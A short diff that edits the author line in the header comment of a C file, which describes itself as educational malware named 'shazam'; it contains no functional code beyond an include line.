@@ -1,6 +1,7 @@
 /*
 * shazam v0.1
-* by synawk
+* by synawk - g
+*
 * -- malware desarrollado con fines educativos
 */
 #include "http.h"
